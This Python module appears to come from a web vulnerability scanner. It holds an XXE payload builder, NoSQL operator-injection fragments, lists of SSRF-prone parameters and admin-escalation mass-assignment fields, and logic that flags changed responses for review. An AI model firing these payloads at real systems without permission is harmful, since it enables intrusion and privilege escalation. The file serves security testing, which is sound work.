"""Injection and logic testing helpers (payloads + pure decision logic).

The orchestration lives in phases/injection.py; the testable pieces are here:
which parameters to try, the payloads, and the rules that decide when a response
difference is meaningful. SSRF and XXE are confirmed out-of-band (a real callback
to our listener); NoSQLi and mass assignment are differential candidates for
manual review. Nothing here asserts a vulnerability on its own.
"""
from __future__ import annotations

import difflib

# Parameter names commonly wired to server-side fetches (SSRF surface).
SSRF_PARAMS = [
    "url", "uri", "dest", "destination", "redirect", "redirect_uri", "next",
    "target", "image", "imageurl", "img", "callback", "webhook", "proxy",
    "fetch", "link", "feed", "host", "site", "domain", "page", "continue",
    "return", "returnurl", "data", "load", "view", "path",
]

# Extra fields an app might bind that it should not (mass assignment).
MASS_ASSIGN_FIELDS = {
    "role": "admin", "is_admin": True, "isAdmin": True, "admin": True,
    "verified": True, "account_type": "admin", "is_superuser": True,
}


def xxe_payload(oob_url: str) -> str:
    """An XML body whose external entity points at our listener."""
    return (f'<?xml version="1.0"?>\n'
            f'<!DOCTYPE r [<!ENTITY x SYSTEM "{oob_url}">]>\n'
            f'<r>&x;</r>')


def nosqli_variants(value: str = "x") -> list[tuple[str, str]]:
    """Return (suffix, value) query fragments that inject Mongo-style operators.
    The caller applies these to a real parameter name as `<name><suffix>=<value>`."""
    return [("[$ne]", value), ("[$gt]", ""), ("[$regex]", ".*")]


def similar(a: str, b: str) -> float:
    if not a or not b:
        return 0.0
    return difflib.SequenceMatcher(None, a[:8000], b[:8000]).ratio()


def behavior_changed(base: tuple[int, str], inj: tuple[int, str],
                     min_len: int = 50) -> bool:
    """True if the injected response differs meaningfully from the baseline:
    a different status code, or a body that is both non-trivial and dissimilar."""
    bstatus, bbody = base
    istatus, ibody = inj
    if istatus == 0:
        return False
    if bstatus != istatus:
        return True
    if len(ibody) >= min_len and similar(bbody, ibody) < 0.9:
        return True
    return False
